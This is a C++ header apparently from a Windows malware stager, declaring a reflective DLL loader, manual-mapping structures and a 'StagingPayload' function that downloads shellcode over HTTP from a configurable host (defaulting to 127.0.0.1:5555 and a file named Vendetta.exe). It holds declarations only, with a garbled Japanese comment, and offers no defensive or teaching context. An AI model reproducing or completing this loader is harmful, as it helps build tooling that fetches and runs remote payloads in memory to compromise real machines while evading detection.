#pragma once

#include <Windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <algorithm>
#include <TlHelp32.h>
#include <vector>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")

using f_LoadLibraryA = HINSTANCE(WINAPI*)(LPCSTR lpLibFilename);
using f_GetProcAddress = FARPROC(WINAPI*)(HMODULE hModule, LPCSTR lpProcName);
using f_DLL_ENTRY_POINT = BOOL(WINAPI*)(LPVOID hDll, DWORD dwReason, LPVOID pReserved);
using ReflectiveLoaderFunc = LPVOID(*)(LPVOID);

struct Arg {
    // URLÇÃÉpÅ[Éc
    wchar_t protocol[50] = L"http://";
    wchar_t ipAddress[50] = L"127.0.0.1";
    wchar_t port[10] = L"5555";
    wchar_t filePath[150] = L"Vendetta.exe";
};



struct MANUAL_MAPPING_DATA {
    f_LoadLibraryA pLoadLibraryA;
    f_GetProcAddress pGetProcAddress;
    PBYTE pBase;
    DWORD fdwReasonParam;
    LPVOID reservedParam;
};

void __stdcall ReflectiveLoader(MANUAL_MAPPING_DATA* pData);
bool StagingPayload(const std::wstring& url, std::vector<BYTE>& shellcode);
std::wstring makeUrl(const Arg& arg);